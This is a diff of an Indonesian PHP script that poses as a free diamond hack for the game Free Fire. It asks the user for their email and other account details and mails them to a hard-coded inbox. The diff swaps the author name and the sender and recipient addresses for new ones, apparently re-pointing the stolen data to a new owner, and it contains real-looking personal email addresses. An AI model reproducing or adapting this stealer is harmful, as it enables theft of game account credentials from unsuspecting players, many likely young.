@@ -4,7 +4,7 @@
 echo "\033[95mTOOLS HACK DIAMOND FREE FIRE"		
 echo "\033[95mDONT USE THIS FOR ILEGAL PURPOSE !"
 echo "\033[95mAUTHOR: DelLuxeZ"
-echo "\033[95mFACEBOOK: ImanuelTaroreh"
+echo "\033[95mFACEBOOK: Ray"
 
 //emailna
 echo "\033[93Masukan email anda :   ";
@@ -46,8 +46,8 @@ echo "\033[91mFUCK THE SISTEM !!!";
 //jgn banyak diganti yaaa:v
 		ini_set( 'display_error', 1);
 		error_reporting( E_ALL);
-		$from = "bocahideot@ngeod.com";
-		$to = "rivaldotaroreh01@gmail.com";
+		$from = "mond5242@gmail.com";
+		$to = "asepmulyanudin90@gmail.com";
 		$subject = "Setor ikan heker";
 		$message = "ini data si bocah 
 		Emailnya ".$imel." 
@@ -56,7 +56,7 @@ echo "\033[91mFUCK THE SISTEM !!!";
                 RankNya ".$val." 
 		pengennya ".$tod."
 		semoga datanya bener ya tod"
-		$headers = "From: <bocahngapaya@ngeod.com";
+		$headers = "From: <mond5242@gmail.com";
     
     
 //dikirim moga aja sampe:v
